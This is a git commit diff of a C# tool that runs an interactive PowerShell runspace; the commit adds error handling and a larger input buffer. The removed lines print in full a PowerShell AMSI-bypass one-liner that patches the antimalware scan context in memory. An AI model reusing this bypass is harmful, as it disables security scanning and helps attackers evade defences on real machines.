c9d672d776705341ed9108908937e9eea13febdc
superhac <superhac@users.noreply.github.com>
2021-11-12 11:46:27 -0600

    Added robust error handling to catch edge cases.  Had to remove amsi bypass as it wasn't working.

--- InteractiveRunspace.cs
+++ InteractiveRunspace.cs
@@ -9,53 +9,78 @@ namespace InteractiveRunspace
 {
     class Program
     {
+
+        private static void runCommand(PowerShell ps, string cmd)
+        {
+            string getError = "get-variable -value -name Error | Format-Table -Wrap -AutoSize";
+            ps.AddScript(cmd);
+            ps.AddCommand("Out-String");
+
+            try
+            {
+                Collection<PSObject> results = ps.Invoke();
+                Console.WriteLine(buildOutput(results).ToString().Trim());
+
+                //check for errors
+                ps.Commands.Clear();
+                ps.AddScript(getError);
+                ps.AddCommand("Out-String");
+                results = ps.Invoke();
+                StringBuilder stringBuilder = buildOutput(results);
+
+                // if $Error holds a value
+                if (!String.Equals(stringBuilder.ToString().Trim(), ""))
+                {
+                    Console.WriteLine(stringBuilder.ToString().Trim());
+
+                    //clear error var
+                    ps.Commands.Clear();
+                    ps.AddScript("$error.Clear()");
+                    ps.Invoke();
+                }
+
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.ToString());
+            }
+            ps.Commands.Clear();
+        }
+
+        private static StringBuilder buildOutput(Collection<PSObject> results)
+        {
+            StringBuilder stringBuilder = new StringBuilder();
+            foreach (PSObject obj in results)
+            {
+                stringBuilder.Append(obj);
+            }
+
+            return stringBuilder;
+        }
+
         static void Main(string[] args)
         {
             string cmd;
+
+            //set a large readline input buffer
+            const int BufferSize =3000;
+            Console.SetIn(new StreamReader(Console.OpenStandardInput(), Encoding.UTF8, false, BufferSize));
+            
             Runspace rs = RunspaceFactory.CreateRunspace();
             PowerShell ps = PowerShell.Create();
             rs.Open();
             ps.Runspace = rs;
 
-            // disable amsi
-            ps.AddScript(@"$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "" * iUtils"") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "" * Context"") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)");
-            ps.Invoke();
-            
             while (true)
             {
-                Console.Write("PS " + Directory.GetCurrentDirectory() + ">");
-                Stream inputStream = Console.OpenStandardInput();
-               
+                Console.Write("PS " + Directory.GetCurrentDirectory() + ">");              
                 cmd = Console.ReadLine();
                
                 if (String.Equals(cmd, "exit"))
                     break;
 
-                Pipeline pipeline = rs.CreatePipeline();
-                pipeline.Commands.AddScript(cmd);
-
-                pipeline.Commands.Add("Out-String");
-
-                try
-                {
-                    Collection<PSObject> results = pipeline.Invoke();
-                    StringBuilder stringBuilder = new StringBuilder();
-
-                    foreach (PSObject obj in results)
-                    {
-                        stringBuilder.Append(obj);
-                    }
-
-                    Console.WriteLine(stringBuilder.ToString().Trim());
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.ToString());
-                }
-                
-               
+                runCommand(ps, cmd);
             }
-
             rs.Close();
         }
     }
